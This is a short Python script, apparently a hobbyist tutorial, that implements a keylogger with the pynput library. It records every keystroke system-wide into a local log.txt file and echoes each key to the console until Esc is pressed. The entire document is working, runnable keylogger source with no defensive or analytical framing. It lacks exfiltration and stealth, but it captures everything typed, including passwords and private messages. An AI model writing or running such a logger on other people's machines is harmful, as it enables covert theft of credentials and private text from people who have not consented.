#Keylogger using pynput module

#import pynput to access the input-output devices...

import pynput


from pynput.keyboard import Key, Listener

keys = []

#creating a function to record which key is pressed in the system

def on_press(key):
    keys.append(key)
    write_file(keys)
    # Use try and expect to get which key is pressed....
    # try will work is any character key will be press...
    # expect will work when any special key like windows key is pressed...

    try:
        print('alphanumeric key {0} pressed'.format(key.char))

        # key.char will give the key pressed.....

    except AttributeError:
        print('special key {0} pressed'.format(key))

#creating second function to write...

def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            # replacing ''
            k = str(key).replace("'", "")
            # keystroke to make it easy read
            f.write(k)


            # every keystroke for readability
            f.write(' ')

# Creating function to know when the key is released

def on_release(key):
    print('{0} released'.format(key))

    # this will print released after the key is released..

    if key == Key.esc:
        # Stop listener
        return False


with Listener(on_press=on_press,
              on_release=on_release) as listener:
    listener.join()
